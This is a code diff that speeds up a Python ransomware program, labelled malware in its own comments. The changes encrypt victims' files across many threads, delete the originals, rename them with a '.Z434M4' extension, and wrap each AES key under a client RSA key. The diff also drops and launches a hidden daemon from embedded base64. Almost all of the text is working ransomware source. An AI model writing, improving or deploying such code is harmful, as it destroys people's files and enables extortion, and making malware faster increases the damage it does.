@@ -14,6 +14,9 @@ import pickle
 import gc
 import subprocess
 import ctypes
+import threading
+import queue
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import serialization, hashes
@@ -52,10 +55,52 @@ def encrypt_priv_key(msg, key):
     return encrypted
 
 
+def encrypt_file(file_info, extensions_map, result_queue):
+    found_file = file_info
+    try:
+        key = generate_keys.generate_key(128, True)
+        AES_obj = symmetric.AESCipher(key)
+        
+        found_file_bytes = base64.b64decode(found_file)
+        found_file_str = found_file_bytes.decode('utf-8')
+
+        # Read file content
+        with open(found_file_bytes, 'rb') as f:
+            file_content = f.read()
+            
+        # Get original file path, name and extension
+        file_path, file_name = os.path.split(found_file_str)
+        file_base, file_ext = os.path.splitext(file_name)
+        
+        # Encrypt the file
+        encrypted = AES_obj.encrypt(file_content)
+        
+        # Delete the original file instead of shredding
+        os.remove(found_file_bytes)
+        
+        # Create new filename with malware extension (replacing original extension)
+        new_file_name = os.path.join(file_path, file_base + ".Z434M4")
+        
+        # Store the mapping between encrypted filename and original extension
+        extensions_map[new_file_name] = file_ext
+        
+        # Write encrypted file
+        with open(new_file_name, 'wb') as f:
+            f.write(encrypted)
+
+        # Add to the list for key storage
+        base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
+        result_queue.put((key, base64_new_file_name))
+        
+    except Exception as e:
+        print(f"Error processing {found_file}: {str(e)}")
+
+
 def start_encryption(files):
-    AES_and_base64_path = []
+    # Shared resources
     extensions_map = {}  # Dictionary to store original extension mappings
     extensions_file_path = os.path.join(variables.ransomware_path, "file_extensions.dat")
+    result_queue = queue.Queue()
     
     # Create directory if it doesn't exist
     os.makedirs(os.path.dirname(extensions_file_path), exist_ok=True)
@@ -68,14 +113,18 @@ def start_encryption(files):
     except:
         pass
     
-    for found_file in files:
-        key = generate_keys.generate_key(128, True)
-        AES_obj = symmetric.AESCipher(key)
-        
-        found_file_bytes = base64.b64decode(found_file)
-        found_file_str = found_file_bytes.decode('utf-8')
-
+    # Create a thread-safe extensions map using a lock
+    extensions_lock = threading.Lock()
+    
+    # Define a thread-safe version of encrypt_file
+    def encrypt_file_thread_safe(file):
         try:
+            key = generate_keys.generate_key(128, True)
+            AES_obj = symmetric.AESCipher(key)
+            
+            found_file_bytes = base64.b64decode(file)
+            found_file_str = found_file_bytes.decode('utf-8')
+
             # Read file content
             with open(found_file_bytes, 'rb') as f:
                 file_content = f.read()
@@ -87,27 +136,46 @@ def start_encryption(files):
             # Encrypt the file
             encrypted = AES_obj.encrypt(file_content)
             
-            # Shred the original file
-            utils.shred(found_file_bytes)
+            # Delete the original file instead of shredding for speed
+            os.remove(found_file_bytes)
             
-            # Create new filename with malware extension (replacing original extension)
+            # Create new filename with malware extension
             new_file_name = os.path.join(file_path, file_base + ".Z434M4")
             
             # Store the mapping between encrypted filename and original extension
-            extensions_map[new_file_name] = file_ext
+            with extensions_lock:
+                extensions_map[new_file_name] = file_ext
             
             # Write encrypted file
             with open(new_file_name, 'wb') as f:
                 f.write(encrypted)
 
-            # Add to the list for key storage
+            # Return the result
             base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))
-            AES_and_base64_path.append((key, base64_new_file_name))
+            return (key, base64_new_file_name)
             
         except Exception as e:
-            print(f"Error processing {found_file_str}: {str(e)}")
-            continue
-
+            print(f"Error processing file: {str(e)}")
+            return None
+    
+    # Use ThreadPoolExecutor for parallel encryption
+    AES_and_base64_path = []
+    max_workers = min(32, os.cpu_count() * 2)  # Limit threads to avoid system overload
+    
+    print(f"Starting encryption with {max_workers} threads")
+    
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all file encryption tasks
+        future_to_file = {executor.submit(encrypt_file_thread_safe, file): file for file in files}
+        
+        # Process results as they complete
+        for future in as_completed(future_to_file):
+            result = future.result()
+            if result:
+                AES_and_base64_path.append(result)
+    
+    print(f"Encrypted {len(AES_and_base64_path)} files")
+    
     # Save the extensions map
     with open(extensions_file_path, 'wb') as ext_file:
         pickle.dump(extensions_map, ext_file)
@@ -127,7 +195,7 @@ def start_encryption(files):
             f.write(encrypted_ext)
             
         # Remove original extensions file
-        utils.shred(extensions_file_path.encode('utf-8'))
+        os.remove(extensions_file_path)
         
         # Store the extensions file key for decryption
         AES_and_base64_path.append((ext_key, base64.b64encode((extensions_file_path + ".Z434M4").encode('utf-8'))))
@@ -176,25 +244,37 @@ def menu():
 
     # FILE ENCRYPTION STARTS HERE !!!
     aes_keys_and_base64_path = start_encryption(files)
+    
+    # Process encryption results in parallel
     enc_aes_key_and_base64_path = []
-
-    for _ in aes_keys_and_base64_path:
-        aes_key = _[0]
-        base64_path = _[1]
-
-       # Add this conversion right before the encryption
+    
+    def encrypt_aes_key(item):
+        aes_key, base64_path = item
+        
+        # Convert key to bytes if it's a string
         if isinstance(aes_key, str):
             aes_key = aes_key.encode('utf-8')
 
         encrypted_aes_key = client_public_key_object.encrypt(
-            aes_key,  # Now this will be bytes
+            aes_key,
             padding.OAEP(
                 mgf=padding.MGF1(algorithm=hashes.SHA256()),
                 algorithm=hashes.SHA256(),
                 label=None
             )
         )
-        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
+        return (encrypted_aes_key, base64_path)
+    
+    # Use ThreadPoolExecutor for parallel AES key encryption
+    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
+        # Submit all key encryption tasks
+        future_to_key = {executor.submit(encrypt_aes_key, item): item for item in aes_keys_and_base64_path}
+        
+        # Process results as they complete
+        for future in as_completed(future_to_key):
+            result = future.result()
+            if result:
+                enc_aes_key_and_base64_path.append(result)
     
     aes_keys_and_base64_path = None
     del aes_keys_and_base64_path
@@ -223,7 +303,6 @@ def drop_daemon_and_decryptor():
     with open(variables.daemon_path, 'wb') as f:
         f.write(base64.b64decode(variables.daemon))
 
-    # Windows doesn't need chmod, but we need to ensure the files are executable
     # Start the daemon process
     subprocess.Popen([variables.daemon_path], shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
